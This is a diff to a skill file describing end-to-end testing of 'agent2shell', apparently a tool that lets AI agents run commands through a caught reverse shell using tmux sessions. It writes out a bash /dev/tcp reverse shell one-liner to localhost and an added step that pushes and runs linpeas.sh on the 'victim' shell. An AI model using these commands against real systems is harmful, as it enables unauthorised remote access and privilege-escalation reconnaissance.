@@ -1,13 +1,10 @@
 ---
-name: agent2shell-e2e-testing
+name: agent2shell-dev-e2e-testing
 description: >
-  How to set up and run end-to-end tests for agent2shell using tmux sessions
-  to simulate a real reverse shell engagement. Use this skill when testing
-  agent2shell manually, setting up a tmux-based test environment, verifying
-  catch/run/status/list/push/pull commands work end-to-end, or when an AI
-  agent needs to automate E2E testing of agent2shell via tmux send-keys.
-  Includes critical rules for automated testing to avoid breaking the
-  interactive terminal.
+  Development E2E testing protocol for agent2shell. Use after adding features
+  or fixing bugs to verify the binary works end-to-end — catch, run, status,
+  list, push, pull, streaming. Uses tmux sessions to simulate a real reverse
+  shell engagement. Includes rules for AI agents automating tests via tmux.
 ---
 
 # E2E Testing with tmux
@@ -21,7 +18,7 @@ Three tmux sessions:
 | Session | Role | What runs |
 |---------|------|-----------|
 | **Session A** | Operator | `agent2shell catch -p 4444` — catches the reverse shell |
-| **Session B** | Victim | `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'` — sends the reverse shell |
+| **Session B** | Victim | `bash -c 'bash >& /dev/tcp/127.0.0.1/4444 0>&1'` — sends the reverse shell |
 | **Session C** | Agent/Tester | `agent2shell run`, `status`, `list`, `push`, `pull` — programmatic access |
 
 ## Steps
@@ -33,7 +30,7 @@ agent2shell catch -p 4444
 
 2. Send reverse shell (Session B)
 ```bash
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+bash -c 'bash >& /dev/tcp/127.0.0.1/4444 0>&1'
 ```
 
 3. Wait for "[*] Session ready: /tmp/a2s-1.sock" in Session A
@@ -53,15 +50,22 @@ agent2shell list --json
 echo "test content" > /tmp/test-push.txt
 agent2shell push /tmp/test-push.txt /tmp/test-received.txt
 agent2shell pull /tmp/test-received.txt /tmp/test-pulled.txt
-diff /tmp/test-push.txt /tmp/test-pulled.txt  # should match
+diff /tmp/test-push.txt /tmp/test-pulled.txt
 ```
 
-6. Test interactive mode in Session A
+6. Test long-running command with timeout
+```bash
+agent2shell push ./linpeas.sh /tmp/linpeas.sh
+agent2shell run "chmod +x /tmp/linpeas.sh"
+agent2shell run -t 300 "/tmp/linpeas.sh"
+```
+
+7. Test interactive mode in Session A
 Type commands directly — output appears in the terminal
 Ctrl-C sends interrupt to remote shell
 Ctrl-C twice within 2 seconds shuts down
 
-7. Clean up
+8. Clean up
 Ctrl-C twice in Session A to shut down
 Session B returns to its shell prompt
 
